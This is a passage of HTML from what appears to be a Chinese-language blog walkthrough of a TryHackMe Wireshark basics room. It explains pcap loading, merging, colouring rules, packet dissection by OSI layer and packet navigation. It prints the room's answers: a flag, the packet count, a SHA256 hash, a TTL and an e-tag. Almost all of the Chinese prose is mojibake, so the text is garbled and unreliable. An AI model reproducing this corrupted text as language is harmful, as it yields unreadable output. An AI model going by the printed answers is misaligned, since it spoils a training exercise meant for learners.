</strong></td>\n<td>å·¥å…·çŠ¶æ€ã€é…ç½®æ–‡ä»¶å’Œæ•°å­—æ•°æ®åŒ…ä¿¡æ¯ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p>ä¸‹å›¾æ˜¾ç¤ºäº† Wireshark çš„ä¸»çª—å£ã€‚è¡¨æ ¼ä¸­è§£é‡Šçš„å„ä¸ªéƒ¨åˆ†å·²é«˜äº®æ˜¾ç¤ºã€‚</p>\n<p>çŽ°åœ¨æ‰“å¼€ Wiresharkï¼Œå¹¶æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d3368000a353a90a5e6d771afd621602.png\" /></p>\n<h5 id=\"åŠ è½½pcapæ–‡ä»¶\">åŠ è½½PCAPæ–‡ä»¶</h5>\n<p>ä¸Šå›¾æ˜¾ç¤ºçš„æ˜¯ Wireshark çš„ç©ºç™½ç•Œé¢ã€‚å”¯ä¸€å¯è§çš„ä¿¡æ¯æ˜¯æœ€è¿‘å¤„ç†çš„<code>http1.pcap</code>æ–‡ä»¶ã€‚è®©æˆ‘ä»¬åŠ è½½è¯¥æ–‡ä»¶ï¼Œçœ‹çœ‹ Wireshark çš„è¯¦ç»†æ•°æ®åŒ…å‘ˆçŽ°æ–¹å¼ã€‚è¯·æ³¨æ„ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong>â€œæ–‡ä»¶â€</strong> èœå•ã€æ‹–æ”¾æ–‡ä»¶æˆ–åŒå‡»æ–‡ä»¶æ¥åŠ è½½pcap æ–‡ä»¶ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/65760ff4da7490d9f5882cbdbc971a12.png\" /></p>\n<p>çŽ°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å·²å¤„ç†çš„æ–‡ä»¶åã€æ•°æ®åŒ…çš„è¯¦ç»†æ•°é‡ä»¥åŠæ•°æ®åŒ…è¯¦æƒ…ã€‚æ•°æ®åŒ…è¯¦æƒ…æ˜¾ç¤ºåœ¨ä¸‰ä¸ªä¸åŒçš„çª—æ ¼ä¸­ï¼Œæ–¹ä¾¿æˆ‘ä»¬ä»¥ä¸åŒçš„æ ¼å¼æŸ¥çœ‹ã€‚</p>\n<table>\n<thead>\n<tr>\n<th>æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼</th>\n<th>æ¯ä¸ªæ•°æ®åŒ…çš„æ‘˜è¦ï¼ˆæºåœ°å€å’Œç›®æ ‡åœ°å€ã€åè®®å’Œæ•°æ®åŒ…ä¿¡æ¯ï¼‰ã€‚æ‚¨å¯ä»¥ç‚¹å‡»åˆ—è¡¨é€‰æ‹©ä¸€ä¸ªæ•°æ®åŒ…è¿›è¡Œæ·±å…¥åˆ†æžã€‚é€‰æ‹©æ•°æ®åŒ…åŽï¼Œè¯¦ç»†ä¿¡æ¯å°†æ˜¾ç¤ºåœ¨å…¶ä»–é¢æ¿ä¸­ã€‚</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>æ•°æ®åŒ…è¯¦æƒ…é¢æ¿</td>\n<td>æ‰€é€‰æ•°æ®åŒ…çš„è¯¦ç»†åè®®åˆ†è§£ã€‚</td>\n</tr>\n<tr>\n<td>æ•°æ®åŒ…å­—èŠ‚çª—æ ¼</td>\n<td>æ˜¾ç¤ºæ‰€é€‰æ•°æ®åŒ…çš„åå…­è¿›åˆ¶å’Œè§£ç åŽçš„ ASCII è¡¨ç¤ºå½¢å¼ã€‚å®ƒä¼šæ ¹æ®è¯¦ç»†ä¿¡æ¯çª—æ ¼ä¸­å•å‡»çš„éƒ¨åˆ†é«˜äº®æ˜¾ç¤ºç›¸åº”çš„æ•°æ®åŒ…å­—æ®µã€‚</td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"æ¶‚è‰²åŒ…\">æ¶‚è‰²åŒ…</h5>\n<p>é™¤äº†å¿«é€Ÿæ˜¾ç¤ºæ•°æ®åŒ…ä¿¡æ¯å¤–ï¼ŒWireshark è¿˜ä¼šæ ¹æ®ä¸åŒçš„æ¡ä»¶å’Œåè®®å¯¹æ•°æ®åŒ…è¿›è¡Œç€è‰²ï¼Œä»¥ä¾¿å¿«é€Ÿå‘çŽ°æ•èŽ·æ•°æ®ä¸­çš„å¼‚å¸¸æƒ…å†µå’Œåè®®ï¼ˆè¿™å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆåœ¨æä¾›çš„å±å¹•æˆªå›¾ä¸­å‡ ä¹Žæ‰€æœ‰å†…å®¹éƒ½æ˜¯ç»¿è‰²çš„ï¼‰ã€‚è¿™ç§å¯¹æ•°æ®åŒ…ä¿¡æ¯çš„å¿«é€ŸæŸ¥çœ‹å¯ä»¥å¸®åŠ©æ‚¨åœ¨åˆ†æžè¿‡ç¨‹ä¸­å‡†ç¡®æ‰¾åˆ°æ‰€éœ€å†…å®¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨åˆ›å»ºè‡ªå®šä¹‰é¢œè‰²è§„åˆ™æ¥çªå‡ºæ˜¾ç¤ºæ„Ÿå…´è¶£çš„äº‹ä»¶ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­ä»‹ç»è¿™äº›è¿‡æ»¤å™¨ã€‚çŽ°åœ¨ï¼Œè®©æˆ‘ä»¬é‡ç‚¹å…³æ³¨é»˜è®¤è®¾ç½®ï¼Œå¹¶äº†è§£å¦‚ä½•æŸ¥çœ‹å’Œä½¿ç”¨æ˜¾ç¤ºçš„æ•°æ®è¯¦ç»†ä¿¡æ¯ã€‚</p>\n<p>Wireshark æä¾›ä¸¤ç§æ•°æ®åŒ…ç€è‰²æ–¹æ³•ï¼šä¸´æ—¶è§„åˆ™å’Œæ°¸ä¹…è§„åˆ™ã€‚ä¸´æ—¶è§„åˆ™ä»…åœ¨å½“å‰ç¨‹åºä¼šè¯æœŸé—´æœ‰æ•ˆï¼Œè€Œæ°¸ä¹…è§„åˆ™åˆ™ä¿å­˜åœ¨é¦–é€‰é¡¹æ–‡ä»¶ï¼ˆé…ç½®æ–‡ä»¶ï¼‰ä¸­ï¼Œå¯åœ¨ä¸‹æ¬¡ç¨‹åºä¼šè¯ä¸­ä½¿ç”¨ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œå³é”®å•å‡»â€èœå•æˆ– <strong>â€œè§†å›¾â€â†’â€œç€è‰²è§„åˆ™â€</strong> èœå•åˆ›å»ºæ°¸ä¹…ç€è‰²è§„åˆ™ã€‚  <strong>â€œç€è‰²æ•°æ®åŒ…åˆ—è¡¨â€èœå•ç”¨äºŽæ¿€æ´»/åœç”¨ç€è‰²è§„åˆ™ã€‚ä¸´æ—¶æ•°æ®åŒ…ç€è‰²åˆ™é€šè¿‡â€œå³é”®å•å‡»â€èœå•æˆ–****â€œè§†å›¾â€â†’â€œä¼šè¯è¿‡æ»¤å™¨â€</strong>èœå• å®Œæˆ  ï¼Œå…·ä½“å†…å®¹å°†åœ¨ä»»åŠ¡ 5 ä¸­ä»‹ç»ã€‚</p>\n<p>é»˜è®¤çš„æ°¸ä¹…ç€è‰²æ•ˆæžœå¦‚ä¸‹æ‰€ç¤ºã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e51c5f19cbc98700ec10f3e2d5ee3c1e.png\" /></p>\n<h5 id=\"äº¤é€šå—…æŽ¢\">äº¤é€šå—…æŽ¢</h5>\n<p>æ‚¨å¯ä»¥ä½¿ç”¨è“è‰² <strong>â€œé²¨é±¼æŒ‰é’®â€</strong> å¯åŠ¨ç½‘ç»œå—…æŽ¢ï¼ˆæ•èŽ·æµé‡ï¼‰ï¼Œçº¢è‰²æŒ‰é’®åœæ­¢å—…æŽ¢ï¼Œç»¿è‰²æŒ‰é’®é‡æ–°å¯åŠ¨å—…æŽ¢è¿‡ç¨‹ã€‚çŠ¶æ€æ è¿˜ä¼šæ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨çš„å—…æŽ¢æŽ¥å£å’Œå·²æ”¶é›†çš„æ•°æ®åŒ…æ•°é‡ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/48afa3db87545b8b3a61a17ed3d912da.png\" /></p>\n<h5 id=\"åˆå¹¶pcapæ–‡ä»¶\">åˆå¹¶PCAPæ–‡ä»¶</h5>\n<p>Wireshark å¯ä»¥å°†ä¸¤ä¸ªpcapæ–‡ä»¶åˆå¹¶æˆä¸€ä¸ªæ–‡ä»¶ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œæ–‡ä»¶ --&gt; åˆå¹¶â€</strong> èœå•è·¯å¾„å°†ä¸€ä¸ªpcap æ–‡ä»¶ä¸Žå·²å¤„ç†çš„æ–‡ä»¶åˆå¹¶ã€‚é€‰æ‹©ç¬¬äºŒä¸ªæ–‡ä»¶åŽï¼ŒWireshark ä¼šæ˜¾ç¤ºæ‰€é€‰æ–‡ä»¶ä¸­çš„æ•°æ®åŒ…æ€»æ•°ã€‚å•å‡»â€œæ‰“å¼€â€åŽï¼Œå®ƒä¼šå°†çŽ°æœ‰çš„pcapæ–‡ä»¶ä¸Žæ‰€é€‰æ–‡ä»¶åˆå¹¶ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªæ–°çš„pcapæ–‡ä»¶ã€‚è¯·æ³¨æ„ï¼Œæ‚¨éœ€è¦å…ˆä¿å­˜åˆå¹¶åŽçš„pcapæ–‡ä»¶æ‰èƒ½è¿›è¡ŒåŽç»­æ“ä½œã€‚</p>\n<p><strong>å‚è§ GIF</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/96dfd118cee616ca0efd8615603806a7.gif\" /></p>\n<h5 id=\"æŸ¥çœ‹æ–‡ä»¶è¯¦æƒ…\">æŸ¥çœ‹æ–‡ä»¶è¯¦æƒ…</h5>\n<p>äº†è§£æ–‡ä»¶è¯¦æƒ…å¾ˆæœ‰å¸®åŠ©ã€‚å°¤å…¶æ˜¯åœ¨å¤„ç†å¤šä¸ªpcapæ–‡ä»¶æ—¶ï¼Œæœ‰æ—¶éœ€è¦äº†è§£å¹¶è®°ä½æ–‡ä»¶è¯¦æƒ…ï¼ˆæ–‡ä»¶å“ˆå¸Œå€¼ã€æ•èŽ·æ—¶é—´ã€æ•èŽ·æ–‡ä»¶æ³¨é‡Šã€æŽ¥å£å’Œç»Ÿè®¡ä¿¡æ¯ï¼‰æ‰èƒ½è¯†åˆ«æ–‡ä»¶ã€å¯¹å…¶è¿›è¡Œåˆ†ç±»å’Œä¼˜å…ˆçº§æŽ’åºã€‚æ‚¨å¯ä»¥é€šè¿‡â€œ<strong>ç»Ÿè®¡ä¿¡æ¯ --&gt; æ•èŽ·æ–‡ä»¶å±žæ€§â€</strong> æˆ–å•å‡»<strong>å·¦ä¸‹è§’çš„ pcap å›¾æ ‡æ¥æŸ¥çœ‹</strong>è¯¦æƒ…ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/17bfa48fe0c899b4171ae2164aa18ed2.gif\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚</p>\n<p>è¯·ä½¿ç”¨â€œExercise.pcapngâ€æ–‡ä»¶å›žç­”é—®é¢˜ã€‚<br />\né˜…è¯» <strong>â€œcapture file commentsâ€</strong><br />\nflagæ˜¯ä»€ä¹ˆï¼Ÿ<br />\nè¿™é‡Œå°±æ˜¯æ‰“å¼€æ–‡ä»¶å±žæ€§æŸ¥çœ‹å³å¯<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/9dc8df73e97f96c1aa83c24a391384b8.png\" /></p>\n<pre><code class=\"language-python\">TryHackMe_Wireshark_Demo\n</code></pre>\n<p>æ•°æ®åŒ…æ€»æ•°æ˜¯å¤šå°‘ï¼Ÿ</p>\n<pre><code class=\"language-python\">58620\n</code></pre>\n<p>æ•èŽ·æ–‡ä»¶çš„<strong>SHA256 å“ˆå¸Œ</strong>å€¼æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/823874dc640593dcc15605635bf2ad81.png\" /></p>\n<pre><code class=\"language-python\">f446de335565fb0b0ee5e5a3266703c778b2f3dfad7efeaeccb2da5641a6d6eb\n</code></pre>\n<h4 id=\"åŒ…è§£å‰–\">åŒ…è§£å‰–</h4>\n<h5 id=\"åŒ…è§£å‰–-1\">åŒ…è§£å‰–</h5>\n<p>æ•°æ®åŒ…å‰–æžä¹Ÿç§°ä¸ºåè®®å‰–æžï¼Œå®ƒé€šè¿‡è§£ç å¯ç”¨çš„åè®®å’Œå­—æ®µæ¥åˆ†æžæ•°æ®åŒ…çš„è¯¦ç»†ä¿¡æ¯ã€‚Wireshark æ”¯æŒå¤šç§åè®®è¿›è¡Œå‰–æžï¼Œæ‚¨ä¹Ÿå¯ä»¥ç¼–å†™è‡ªå·±çš„å‰–æžè„šæœ¬ã€‚æ‚¨å¯ä»¥<a href=\"https://github.com/boundary/wireshark/blob/master/doc/README.dissector\" rel=\"noopener nofollow\" target=\"_blank\"><strong>åœ¨è¿™é‡Œ:https://github.com/boundary/wireshark/blob/master/doc/README.dissector</strong></a>æ‰¾åˆ°æ›´å¤šå…³äºŽå‰–æžçš„è¯¦ç»†ä¿¡æ¯ã€‚</p>\n<p><strong>æ³¨æ„ï¼š</strong> æœ¬èŠ‚ä»‹ç» Wireshark å¦‚ä½•ä½¿ç”¨ OSI å±‚æ¥åˆ†è§£æ•°æ®åŒ…ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨è¿™äº›å±‚è¿›è¡Œåˆ†æžã€‚å‡è®¾æ‚¨å·²ç»å…·å¤‡ OSI æ¨¡åž‹åŠå…¶å·¥ä½œåŽŸç†æ–¹é¢çš„åŸºç¡€çŸ¥è¯†ã€‚</p>\n<h5 id=\"æ•°æ®åŒ…è¯¦æƒ…\">æ•°æ®åŒ…è¯¦æƒ…</h5>\n<p>æ‚¨å¯ä»¥ç‚¹å‡»æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼ä¸­çš„æ•°æ®åŒ…ä»¥æŸ¥çœ‹å…¶è¯¦ç»†ä¿¡æ¯ï¼ˆåŒå‡»å°†åœ¨æ–°çª—å£ä¸­æ‰“å¼€è¯¦ç»†ä¿¡æ¯ï¼‰ã€‚æ•°æ®åŒ…ç”±åŸºäºŽ OSI æ¨¡åž‹çš„ 5 åˆ° 7 å±‚ç»„æˆã€‚æˆ‘ä»¬å°†é€šè¿‡ä¸€ä¸ªç¤ºä¾‹æ•èŽ·çš„HTTPæ•°æ®åŒ…æ¥é€ä¸€äº†è§£è¿™äº›å±‚ã€‚ä¸‹å›¾æ˜¾ç¤ºçš„æ˜¯ç¬¬ 27 ä¸ªæ•°æ®åŒ…ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/4f57f1f8f185dba0d713ca0616a6c9bd.png\" /><br />\næ¯æ¬¡å•å‡»æŸä¸ªç»†èŠ‚æ—¶ï¼Œéƒ½ä¼šåœ¨æ•°æ®åŒ…å­—èŠ‚çª—æ ¼ä¸­çªå‡ºæ˜¾ç¤ºç›¸åº”çš„éƒ¨åˆ†ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a702689d9d812eccf70eb7cd61f469c2.png\" /><br />\nè®©æˆ‘ä»¬ä»”ç»†çœ‹ä¸€ä¸‹è¯¦ç»†ä¿¡æ¯çª—æ ¼ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e488f196abd1feb9516275a5fbb9d0b9.png\" /></p>\n<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•°æ®åŒ…ç”±ä¸ƒä¸ªä¸åŒçš„å±‚ç»„æˆï¼šï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œå’Œã€‚<code>frame/packet</code>ä¸‹é¢æˆ‘ä»¬å°†æ›´è¯¦ç»†åœ°ä»‹ç»è¿™äº›å±‚ã€‚<br />\n<code>source [MAC]</code> <code>source [IP]</code> <code>protocol</code> <code>protocol errors</code> <code>application protocol</code> <code>application data</code></p>\n<hr />\n<p><strong>å¸§ï¼ˆç¬¬ 1 å±‚ï¼‰ï¼š</strong> è¿™å°†æ˜¾ç¤ºæ‚¨æ­£åœ¨æŸ¥çœ‹çš„å¸§/æ•°æ®åŒ…ä»¥åŠ OSI æ¨¡åž‹ç‰©ç†å±‚çš„ç‰¹å®šè¯¦ç»†ä¿¡æ¯ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d6e6e5f1a63ed2a2c5982fe33ecdca0d.png\" /></p>\n<hr />\n<p><strong>æº MAC åœ°å€ï¼ˆç¬¬ 2 å±‚ï¼‰ï¼š</strong> è¿™å°†æ˜¾ç¤ºæº MAC åœ°å€å’Œç›®æ ‡ MAC åœ°å€ï¼›æ¥è‡ª OSI æ¨¡åž‹çš„æ•°æ®é“¾è·¯å±‚ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/14396785c40e7af65fa35dddaa6bff24.png\" /></p>\n<hr />\n<p><strong>æº <code>[IP]</code>ï¼ˆç¬¬ 3 å±‚ï¼‰ï¼š</strong> è¿™å°†æ˜¾ç¤ºæº IPv4 åœ°å€å’Œç›®æ ‡ IPv4 åœ°å€ï¼›æ¥è‡ª OSI æ¨¡åž‹çš„ç½‘ç»œå±‚ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/62ad565dbe0b395477e54285c2f0f3de.png\" /></p>\n<hr />\n<p><strong>åè®®ï¼ˆç¬¬ 4 å±‚ï¼‰ï¼š</strong> è¿™å°†æ˜¾ç¤ºæ‰€ä½¿ç”¨çš„åè®®ï¼ˆUDP / TCPï¼‰ä»¥åŠæºç«¯å£å’Œç›®æ ‡ç«¯å£çš„è¯¦ç»†ä¿¡æ¯ï¼›æ¥è‡ª OSI æ¨¡åž‹çš„ä¼ è¾“å±‚ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/c79d3075ce4140b7657c89da8a4362f7.png\" /></p>\n<hr />\n<p><strong>åè®®é”™è¯¯ï¼š</strong> è¿™æ˜¯ç¬¬å››å±‚çš„å»¶ç»­ï¼Œæ˜¾ç¤ºäº†éœ€è¦é‡æ–°ç»„è£…çš„TCPç‰¹å®šæ®µã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/b7f76a275e3a29ea2ce5056f57df8c71.png\" /></p>\n<hr />\n<p><strong>åº”ç”¨å±‚åè®®ï¼ˆç¬¬ 5 å±‚ï¼‰ï¼š</strong> æ­¤å¤„å°†æ˜¾ç¤ºæ‰€ç”¨åè®®çš„å…·ä½“ä¿¡æ¯ï¼Œä¾‹å¦‚HTTPã€FTPå’ŒSMBã€‚æ­¤éƒ¨åˆ†å±žäºŽ OSI æ¨¡åž‹çš„åº”ç”¨å±‚ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/61e927f21f9994388e3adce00a57f865.png\" /></p>\n<hr />\n<p><strong>åº”ç”¨æ•°æ®ï¼š</strong> æ­¤ç¬¬äº”å±‚çš„æ‰©å±•å¯ä»¥æ˜¾ç¤ºç‰¹å®šäºŽåº”ç”¨ç¨‹åºçš„æ•°æ®ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/bcc328f77eabba22d4261f30740d9c35.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜ã€‚<br />\nè¯·ä½¿ç”¨â€œExercise.pcapngâ€æ–‡ä»¶å›žç­”é—®é¢˜ã€‚<strong>å‚è§ç¬¬38é¢˜ã€‚HTTP</strong>åè®®ä½¿ç”¨å“ªç§æ ‡è®°è¯­è¨€ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a23bf659218c7ccf45f7c0287797687b.png\" /></p>\n<pre><code class=\"language-python\">eXtensible Markup Language\n</code></pre>\n<p>åŒ…çš„åˆ°è¾¾æ—¥æœŸæ˜¯ä»€ä¹ˆæ—¶å€™ï¼Ÿï¼ˆç­”æ¡ˆæ ¼å¼ï¼šæœˆ/æ—¥/å¹´ï¼‰<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/6c05aff75e53e14fe9a906df0e782111.png\" /></p>\n<pre><code class=\"language-python\">05/13/2004\n</code></pre>\n<p>TTLå€¼æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/7a6a66f7d36cd43f10f402d05ce4a25a.png\" /></p>\n<pre><code class=\"language-python\">47\n</code></pre>\n<p>TCPæœ‰æ•ˆè½½è·å¤§å°æ˜¯å¤šå°‘ï¼Ÿ<br />\nå±•å¼€ä¼ è¾“å±‚æŸ¥çœ‹<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/faa68df0262d4f346ae0671b7c9b7b41.png\" /></p>\n<pre><code class=\"language-python\">424\n</code></pre>\n<p>e-tagçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nï¼ˆä¾‹å¦‚ï¼š82ecb-6321-9e904585ï¼‰<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/70bb3f3cec64b6ea40f2ee602baf7e58.png\" /></p>\n<pre><code class=\"language-python\">9a01a-4696-7e354b00\n</code></pre>\n<h4 id=\"æ•°æ®åŒ…å¯¼èˆª\">æ•°æ®åŒ…å¯¼èˆª</h4>\n<h5 id=\"æ•°æ®åŒ…ç¼–å·\">æ•°æ®åŒ…ç¼–å·</h5>\n<p>Wireshark ä¼šè®¡ç®—è¢«åˆ†æžçš„æ•°æ®åŒ…æ•°é‡ï¼Œå¹¶ä¸ºæ¯ä¸ªæ•°æ®åŒ…åˆ†é…ä¸€ä¸ªå”¯ä¸€çš„ç¼–å·ã€‚è¿™æœ‰åŠ©äºŽåˆ†æžå¤§åž‹æ•°æ®åŒ…ï¼Œå¹¶æ–¹ä¾¿ç”¨æˆ·å›žæº¯åˆ°äº‹ä»¶çš„ç‰¹å®šæ—¶é—´ç‚¹ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/39d8e435213e94501f18a2ecd00f453f.png\" /></p>\n<h5 id=\"å‰å¾€æ•°æ®åŒ…\">å‰å¾€æ•°æ®åŒ…</h5>\n<p>æ•°æ®åŒ…ç¼–å·ä¸ä»…æœ‰åŠ©äºŽç»Ÿè®¡æ•°æ®åŒ…æ€»æ•°ï¼Œè¿˜èƒ½æ–¹ä¾¿åœ°æŸ¥æ‰¾/åˆ†æžç‰¹å®šæ•°æ®åŒ…ã€‚æ­¤åŠŸèƒ½ä¸ä»…å¯ä»¥ä¸Šä¸‹å¯¼èˆªæ•°æ®åŒ…ï¼Œè¿˜èƒ½è¿›è¡Œå¸§å†…æ•°æ®åŒ…è·Ÿè¸ªï¼Œå¹¶æŸ¥æ‰¾ä¼šè¯ç‰¹å®šéƒ¨åˆ†ä¸­çš„ä¸‹ä¸€ä¸ªæ•°æ®åŒ…ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œå‰å¾€â€</strong> èœå•å’Œå·¥å…·æ æŸ¥çœ‹ç‰¹å®šæ•°æ®åŒ…ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/8c33d386048c67861e45e96ad1197450.gif\" /></p>\n<h5 id=\"æŸ¥æ‰¾æ•°æ®åŒ…\">æŸ¥æ‰¾æ•°æ®åŒ…</h5>\n<p>é™¤äº†æ•°æ®åŒ…ç¼–å·ï¼ŒWireshark è¿˜å¯ä»¥é€šè¿‡æ•°æ®åŒ…å†…å®¹æŸ¥æ‰¾æ•°æ®åŒ…ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œç¼–è¾‘ --&gt; æŸ¥æ‰¾æ•°æ®åŒ…â€</strong> èœå•åœ¨æ•°æ®åŒ…ä¸­æœç´¢ç‰¹å®šäº‹ä»¶ã€‚è¿™æœ‰åŠ©äºŽåˆ†æžäººå‘˜å’Œç®¡ç†å‘˜æŸ¥æ‰¾ç‰¹å®šçš„å…¥ä¾µæ¨¡å¼æˆ–æ•…éšœè½¨è¿¹ã€‚</p>\n<p>æŸ¥æ‰¾æ•°æ®åŒ…æœ‰ä¸¤ä¸ªå…³é”®ç‚¹ã€‚é¦–å…ˆæ˜¯äº†è§£è¾“å…¥ç±»åž‹ã€‚æ­¤åŠŸèƒ½æŽ¥å—å››ç§ç±»åž‹çš„è¾“å…¥ï¼ˆæ˜¾ç¤ºè¿‡æ»¤å™¨ã€åå…­è¿›åˆ¶ã€å­—ç¬¦ä¸²å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼‰ã€‚å­—ç¬¦ä¸²å’Œæ­£åˆ™è¡¨è¾¾å¼æœç´¢æ˜¯æœ€å¸¸ç”¨çš„æœç´¢ç±»åž‹ã€‚æœç´¢é»˜è®¤ä¸åŒºåˆ†å¤§å°å†™ï¼Œä½†æ‚¨å¯ä»¥é€šè¿‡å•å‡»å•é€‰æŒ‰é’®æ¥è®¾ç½®æœç´¢æ˜¯å¦åŒºåˆ†å¤§å°å†™ã€‚</p>\n<p>ç¬¬äºŒç‚¹æ˜¯é€‰æ‹©æœç´¢å­—æ®µã€‚æ‚¨å¯ä»¥åœ¨ä¸‰ä¸ªçª—æ ¼ï¼ˆæ•°æ®åŒ…åˆ—è¡¨ã€æ•°æ®åŒ…è¯¦ç»†ä¿¡æ¯å’Œæ•°æ®åŒ…å­—èŠ‚ï¼‰ä¸­è¿›è¡Œæœç´¢ï¼Œäº†è§£æ¯ä¸ªçª—æ ¼ä¸­å¯ç”¨çš„ä¿¡æ¯å¯¹äºŽæ‰¾åˆ°æ„Ÿå…´è¶£çš„äº‹ä»¶è‡³å…³é‡è¦ã€‚ä¾‹å¦‚ï¼Œå¦‚æžœæ‚¨å°è¯•åœ¨æ•°æ®åŒ…åˆ—è¡¨çª—æ ¼ä¸­æŸ¥æ‰¾æ•°æ®åŒ…è¯¦ç»†ä¿¡æ¯çª—æ ¼ä¸­çš„ä¿¡æ¯ï¼Œå³ä½¿è¯¥ä¿¡æ¯å­˜åœ¨ï¼ŒWireshark ä¹Ÿæ‰¾ä¸åˆ°ã€‚</p>\n<p>PS: å…¶å®žCtrl+f å¿«æ·é”®èƒ½å¿«é€Ÿå”¤å‡º<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/fe406030ae09e0e29c2df558037b7abf.gif\" /></p>\n<h5 id=\"æ ‡è®°åŒ…\">æ ‡è®°åŒ…</h5>\n<p>æ ‡è®°æ•°æ®åŒ…æ˜¯åˆ†æžäººå‘˜çš„å¦ä¸€é¡¹å®žç”¨åŠŸèƒ½ã€‚æ‚¨å¯ä»¥é€šè¿‡æ ‡è®°æ¥æŸ¥æ‰¾/å®šä½ç‰¹å®šæ•°æ®åŒ…ï¼Œä»¥ä¾¿è¿›è¡Œæ·±å…¥è°ƒæŸ¥ã€‚è¿™æœ‰åŠ©äºŽåˆ†æžäººå‘˜æ‰¾åˆ°æ„Ÿå…´è¶£çš„äº‹ä»¶æˆ–ä»Žæ•èŽ·çš„æ•°æ®ä¸­å¯¼å‡ºç‰¹å®šæ•°æ®åŒ…ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œç¼–è¾‘â€</strong> æˆ– <strong>â€œå³é”®å•å‡»â€</strong> èœå•æ¥æ ‡è®°/å–æ¶ˆæ ‡è®°æ•°æ®åŒ…ã€‚</p>\n<p>æ— è®ºåŽŸå§‹è¿žæŽ¥ç±»åž‹ä»£è¡¨çš„é¢œè‰²æ˜¯ä»€ä¹ˆï¼Œæ ‡è®°çš„æ•°æ®åŒ…éƒ½å°†ä»¥é»‘è‰²æ˜¾ç¤ºã€‚è¯·æ³¨æ„ï¼Œæ ‡è®°çš„æ•°æ®åŒ…ä¿¡æ¯åœ¨æ¯ä¸ªæ–‡ä»¶ä¼šè¯æœŸé—´éƒ½ä¼šæ›´æ–°ï¼Œå› æ­¤å…³é—­æ•èŽ·æ–‡ä»¶åŽï¼Œæ ‡è®°çš„æ•°æ®åŒ…å°†ä¼šä¸¢å¤±ã€‚<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/5572e14367523debf7fb7dabf7fac02e.gif\" /></p>\n<h5 id=\"æ•°æ®åŒ…æ³¨é‡Š\">æ•°æ®åŒ…æ³¨é‡Š</h5>\n<p>ä¸Žæ•°æ®åŒ…æ ‡è®°ç±»ä¼¼ï¼Œæ³¨é‡Šæ˜¯åˆ†æžäººå‘˜çš„å¦ä¸€é¡¹å®žç”¨åŠŸèƒ½ã€‚æ‚¨å¯ä»¥ä¸ºç‰¹å®šæ•°æ®åŒ…æ·»åŠ æ³¨é‡Šï¼Œä»¥å¸®åŠ©è¿›ä¸€æ­¥è°ƒæŸ¥ï¼Œæˆ–æé†’å…¶ä»–å±‚åˆ†æžäººå‘˜æ³¨æ„é‡è¦/å¯ç–‘ä¹‹å¤„ã€‚ä¸Žæ•°æ®åŒ…æ 